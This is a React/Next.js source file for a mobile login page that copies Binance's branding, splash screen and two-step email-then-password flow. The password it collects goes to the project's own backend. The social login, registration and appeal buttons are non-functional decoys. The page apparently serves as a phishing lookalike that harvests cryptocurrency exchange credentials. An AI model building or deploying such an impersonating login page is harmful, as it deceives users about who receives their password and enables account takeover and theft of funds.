"use client";
import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { api, auth } from "@/lib/api";
import { BinanceMark } from "@/components/icons";

type Step = "id" | "password" | "help" | "register";

const X = ({ s = 22 }: { s?: number }) => (
  <svg width={s} height={s} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round"><path d="M5 5l14 14M19 5L5 19" /></svg>
);
const Back = () => (
  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M20 12H4M10 6l-6 6 6 6" /></svg>
);
const Eye = ({ off }: { off?: boolean }) => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round"><path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12z" /><circle cx="12" cy="12" r="3" />{off && <path d="M4 4l16 16" />}</svg>
);
const Arrow = () => (
  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M4 12h16M14 6l6 6-6 6" /></svg>
);
const PasskeyI = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round"><circle cx="9" cy="8" r="3.5" /><path d="M2.5 20c0-3.6 2.9-6.5 6.5-6.5 1.4 0 2.6.4 3.6 1.1" /><circle cx="18" cy="10" r="2.5" /><path d="M18 12.5V20l1.5-1.2M18 16.5h1.5" /></svg>
);
const GoogleI = () => (
  <svg width="22" height="22" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.6 20.5H42V20H24v8h11.3C33.7 32.7 29.2 36 24 36c-6.6 0-12-5.4-12-12s5.4-12 12-12c3 0 5.8 1.1 7.9 3l5.7-5.7C34 6.1 29.3 4 24 4 12.9 4 4 12.9 4 24s8.9 20 20 20 20-8.9 20-20c0-1.3-.1-2.4-.4-3.5z"/><path fill="#FF3D00" d="M6.3 14.7l6.6 4.8C14.7 15.1 19 12 24 12c3 0 5.8 1.1 7.9 3l5.7-5.7C34 6.1 29.3 4 24 4 16.3 4 9.7 8.3 6.3 14.7z"/><path fill="#4CAF50" d="M24 44c5.2 0 9.9-2 13.4-5.2l-6.2-5.2C29.2 35.1 26.7 36 24 36c-5.2 0-9.6-3.3-11.3-8l-6.5 5C9.5 39.6 16.2 44 24 44z"/><path fill="#1976D2" d="M43.6 20.5H42V20H24v8h11.3c-.8 2.2-2.2 4.2-4.1 5.6l6.2 5.2C37 39.2 44 34 44 24c0-1.3-.1-2.4-.4-3.5z"/></svg>
);
const AppleI = () => (
  <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M16.4 12.6c0-2.6 2.1-3.8 2.2-3.9-1.2-1.8-3.1-2-3.7-2-1.6-.2-3.1.9-3.9.9-.8 0-2-.9-3.4-.9-1.7 0-3.3 1-4.2 2.6-1.8 3.1-.5 7.7 1.3 10.2.9 1.2 1.9 2.6 3.2 2.6 1.3-.1 1.8-.8 3.3-.8 1.6 0 2 .8 3.4.8 1.4 0 2.3-1.3 3.1-2.5 1-1.4 1.4-2.8 1.4-2.9-.1 0-2.7-1-2.7-4.1zM13.9 5c.7-.9 1.2-2 1-3.2-1 .1-2.2.7-3 1.5-.6.7-1.2 1.9-1 3.1 1.1.1 2.3-.6 3-1.4z"/></svg>
);
const TelegramI = () => (
  <svg width="22" height="22" viewBox="0 0 24 24" fill="#2AABEE"><path d="M21.5 3.5L2.8 10.7c-1 .4-1 1.6 0 1.9l4.6 1.5 1.8 5.6c.2.7 1.1.9 1.6.4l2.6-2.4 4.8 3.5c.6.4 1.4.1 1.6-.6L22.9 5c.3-1.1-.6-1.9-1.4-1.5zM9.6 14.2l8.6-7.6-10.6 6.5"/></svg>
);
const HeadsetI = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6"><path d="M4 14v-2a8 8 0 0116 0v2" /><rect x="3" y="13" width="4" height="7" rx="1.5" /><rect x="17" y="13" width="4" height="7" rx="1.5" /></svg>
);

function mask(id: string) {
  if (id.includes("@")) { const [n, d] = id.split("@"); return `${n.slice(0, 2)}***@${d}`; }
  return id.length > 4 ? `${id.slice(0, 2)}***${id.slice(-2)}` : id;
}

const field = "h-[52px] w-full rounded-lg bg-card px-4 text-[16px] text-fg outline-none placeholder:text-dim focus:ring-1 focus:ring-brand";
const primary = "flex h-[50px] w-full items-center justify-center rounded-lg bg-brand text-[16px] font-medium text-brand-fg disabled:opacity-60";
const social = "relative flex h-[50px] w-full items-center justify-center rounded-xl border border-line text-[16px] text-fg active:bg-card";

function Dots() {
  return <span className="flex gap-1">{[0, 1, 2].map((i) => <span key={i} className="size-1.5 animate-pulse rounded-full bg-brand-fg" style={{ animationDelay: `${i * 150}ms` }} />)}</span>;
}

export default function Login() {
  const router = useRouter();
  const [splash, setSplash] = useState(false);
  const [step, setStep] = useState<Step>("id");
  const [u, setU] = useState("");
  const [p, setP] = useState("");
  const [show, setShow] = useState(false);
  const [err, setErr] = useState("");
  const [busy, setBusy] = useState(false);
  const pwRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    const standalone = window.matchMedia("(display-mode: standalone)").matches || (navigator as any).standalone;
    if (standalone && !sessionStorage.getItem("bn_splash")) { sessionStorage.setItem("bn_splash", "1"); setSplash(true); setTimeout(() => setSplash(false), 1800); }
    auth.clear();
    const prev = localStorage.getItem("bn_last_user"); if (prev) setU(prev);
  }, []);

  useEffect(() => { if (step === "password") setTimeout(() => pwRef.current?.focus(), 50); }, [step]);

  function next(e: React.FormEvent) {
    e.preventDefault(); if (!u.trim()) return;
    setErr(""); setBusy(true);
    setTimeout(() => { setBusy(false); setStep("password"); }, 500);
  }

  async function submit(e: React.FormEvent) {
    e.preventDefault(); setErr(""); setBusy(true);
    try { await api.login(u.trim(), p); localStorage.setItem("bn_last_user", u.trim()); router.replace("/"); }
    catch (x) { setErr((x as Error).message || "Incorrect password. Please try again."); }
    finally { setBusy(false); }
  }

  if (splash) return (
    <div className="fixed inset-0 flex flex-col items-center justify-center bg-bg">
      <div className="splash-logo flex flex-col items-center gap-3"><BinanceMark size={64} /><span className="text-[30px] font-bold tracking-[0.12em] text-brand">BINANCE</span></div>
    </div>
  );

  const go = (t: Step) => { setErr(""); setStep(t); };

  if (step === "password") return (
    <Frame go={go} back="id">
      <h1 className="mt-6 text-[30px] font-semibold leading-tight">Enter your password</h1>
      <p className="mt-2 text-[14px] text-muted">{mask(u.trim())}</p>
      <form onSubmit={submit} className="mt-8">
        <label className="text-[14px] text-muted">Password</label>
        <div className="relative mt-2">
          <input ref={pwRef} value={p} onChange={(e) => setP(e.target.value)} type={show ? "text" : "password"} autoComplete="current-password" className={`${field} pr-20`} />
          <div className="absolute right-4 top-1/2 flex -translate-y-1/2 items-center gap-4 text-muted">
            {p && <button type="button" aria-label="Clear" onClick={() => setP("")}><X s={18} /></button>}
            <button type="button" aria-label="Show password" onClick={() => setShow(!show)}><Eye off={!show} /></button>
          </div>
        </div>
        {err && <p className="mt-3 text-[13px] text-down">{err}</p>}
        <button disabled={busy || !p} className={`${primary} mt-6`}>{busy ? <Dots /> : "Continue"}</button>
        <button type="button" onClick={() => setStep("help")} className="mt-6 text-[15px] text-brand">Forgot password?</button>
      </form>
    </Frame>
  );

  if (step === "help") return (
    <Frame go={go} back="id">
      <h1 className="mt-6 text-[30px] font-semibold leading-tight">Need help to log in?</h1>
      <div className="mt-8 flex flex-col gap-3">
        <button onClick={() => setStep("id")} className="flex items-center justify-between rounded-lg bg-card px-4 py-4 text-left">
          <span><span className="block text-[16px] text-fg">I Remember My Account</span><span className="mt-1 block text-[12px] text-muted">Click here to start resetting your password.</span></span><Arrow />
        </button>
        <button className="flex items-center justify-between rounded-lg bg-card px-4 py-4 text-left">
          <span><span className="block text-[16px] text-fg">I Forgot My Account</span><span className="mt-1 block text-[12px] text-muted">I don&apos;t remember the email or phone number I used for my Binance account. Click here to start an appeal.</span></span><Arrow />
        </button>
      </div>
    </Frame>
  );

  if (step === "register") return (
    <Frame go={go} right={<span className="text-fg"><HeadsetI /></span>}>
      <h1 className="mt-6 text-[32px] font-semibold leading-tight">Welcome to Binance</h1>
      <div className="mt-10">
        <label className="text-[14px] text-muted">Email/Phone number</label>
        <input className={`${field} mt-2`} placeholder="Email/Phone (without country code)" />
      </div>
      <label className="mt-5 flex gap-3 text-[15px] leading-7 text-fg">
        <input type="checkbox" defaultChecked className="mt-1.5 size-5 accent-[var(--color-muted)]" />
        <span>By creating an account, I agree to Binance&apos;s <span className="border-b border-dotted border-muted">Privacy Notice</span>.</span>
      </label>
      <button className={`${primary} mt-6`}>Register</button>
      <Or />
      <div className="flex flex-col gap-3">
        <button className={social}><span className="absolute left-5"><GoogleI /></span>Continue with Google</button>
        <button className={social}><span className="absolute left-5"><TelegramI /></span>Continue with Telegram</button>
      </div>
      <p className="mt-8 text-[16px]"><span className="text-brand">Sign up as an entity</span> <span className="mx-1 text-[14px] text-muted">or</span> <button onClick={() => setStep("id")} className="text-brand">Log in</button></p>
    </Frame>
  );

  return (
    <Frame go={go}>
      <h1 className="mt-6 text-[32px] font-semibold leading-tight">Log in</h1>
      <form onSubmit={next} className="mt-10">
        <label className="text-[14px] text-muted">Email/Phone number</label>
        <div className="relative mt-2">
          <input value={u} onChange={(e) => setU(e.target.value)} autoComplete="username" placeholder="Email/Phone (without country code)" className={`${field} pr-12`} />
          {u && <button type="button" aria-label="Clear" onClick={() => setU("")} className="absolute right-4 top-1/2 -translate-y-1/2 text-muted"><X s={20} /></button>}
        </div>
        <button disabled={busy || !u.trim()} className={`${primary} mt-6`}>{busy ? <Dots /> : "Log In"}</button>
      </form>
      <Or />
      <div className="flex flex-col gap-3">
        <button className={social}><span className="absolute left-5"><PasskeyI /></span>Continue with Passkey</button>
        <button className={social}><span className="absolute left-5"><GoogleI /></span>Continue with Google</button>
        <button className={social}><span className="absolute left-5"><AppleI /></span>Continue with Apple</button>
        <button className={social}><span className="absolute left-5"><TelegramI /></span>Continue with Telegram</button>
      </div>
      <button onClick={() => setStep("register")} className="mt-8 self-start text-[16px] text-brand">Create a Binance Account</button>
      <button onClick={() => setStep("help")} className="mt-6 self-start text-[16px] text-brand">Can&apos;t log in?</button>
    </Frame>
  );
}

function Or() {
  return <div className="my-5 flex items-center gap-4 text-[15px] text-muted"><span className="h-px flex-1 bg-line" />or<span className="h-px flex-1 bg-line" /></div>;
}

function Frame({ children, back, right, go }: { children: React.ReactNode; back?: Step; right?: React.ReactNode; go: (s: Step) => void }) {
  return (
    <div className="safe-top mx-auto flex min-h-dvh max-w-[480px] flex-col bg-bg px-6">
      <div className="flex h-14 items-center justify-between text-fg">
        {back ? <button aria-label="Back" onClick={() => go(back)}><Back /></button> : <button aria-label="Close" onClick={() => go("id")}><X /></button>}
        {right ?? (back ? <button aria-label="Close" onClick={() => go("id")}><X /></button> : null)}
      </div>
      {children}
    </div>
  );
}
